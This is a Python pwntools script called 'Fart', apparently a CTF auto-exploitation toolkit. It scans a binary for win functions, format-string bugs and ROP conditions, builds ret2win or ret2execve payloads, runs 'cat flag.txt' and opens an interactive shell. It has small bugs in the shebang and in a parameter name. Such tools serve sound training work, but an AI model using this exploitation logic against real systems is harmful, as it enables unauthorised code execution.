#!/bin/pythoni
from pwn import *
import sys
from analyze import *
import Fart_FMT
import Fart_ROP
import time

logging.getLogger('pwnlib').setLevel(logging.WARNING)

banner = '''
   ad88                                
  d8"                           ,d     
  88                            88     
MM88MMM ,adPPYYba, 8b,dPPYba, MM88MMM  
  88    ""     `Y8 88P'   "Y8   88     
  88    ,adPPPPP88 88           88     
  88    88,    ,88 88           88,    
  88    `"8bbdP"Y8 88           "Y888
  
  Format and ROP Toolkit
'''

def check_vuln_type(binary):
    properties = {} 
    if binary.has_binsh():
        print("[+] String of interest: 'binsh' present")
        properties["binsh"] = True
    else:
        properties["binsh"] = False

    if binary.has_flagtxt():
        print("[+] String of interest: 'flag.txt' present")
        properties["flag"] = True
    else:
        properties["flag"] = False

    if binary.has_catflagtxt():
        print("[+] String of interest: 'cat flag.txt' present")
        properties["cat"] = True
    else:
        properties["cat"] = False

    if binary.has_gets():
        print("[+] Gets present")
        properties["gets"] = True
    else:
        properties["gets"] = False

    if binary.has_win():
        print("[+] Win function present")
        properties["win"] = True
    else:
        properties["win"] = False

    if binary.has_system():
        print("[+] System function present")
        properties["system"] = True
    else:
        properties["system"] = False

    if binary.has_printf():
        print("[+] Printf function present")
        properties["printf"] = True
    else:
        properties["printf"] = False

    if binary.has_syscall():
        print("[+] Syscall function present")
        properties["syscall"] = True
    else:
        properties["syscall"] = False

    if binary.has_format():
        print("[+] Possible format string bug")
        properties["format"] = True
    else:
        properties["format"] = False

    if binary.has_execve():
        print("[+] Execve function present")
        properties["execve"] = True
    else:
        properties["execve"] = False

    if binary.has_rop():
        print("[+] Possible ROP conditions")
        properties["rop"] = True
    else:
        properties["rop"] = False

    return properties

def exploit(analyize, properties):
    binary = analyze.binary
    p = process(binary)
    payload = None
    
    rop = Fart_ROP.ROP(analyze, properties)
    if properties["win"]:
        payload = rop.ret2win()
    elif properties["execve"]:
        payload = rop.ret2execve()    

    if payload:
        p.sendline(payload)
        if properties["binsh"]:
            sleep(0.1)
            p.sendline(b"cat flag.txt")
        p.interactive()
        print("\U0001F525"*30)

if __name__ == "__main__":
    binary = args.BIN
    if not binary:
        print("Usage: ./fart.py BIN=<path to binary>")
        sys.exit(-1)
        
    print(banner)
    
    analyze = Analyze(binary)
    properties = check_vuln_type(analyze)
    exploit(analyze, properties)
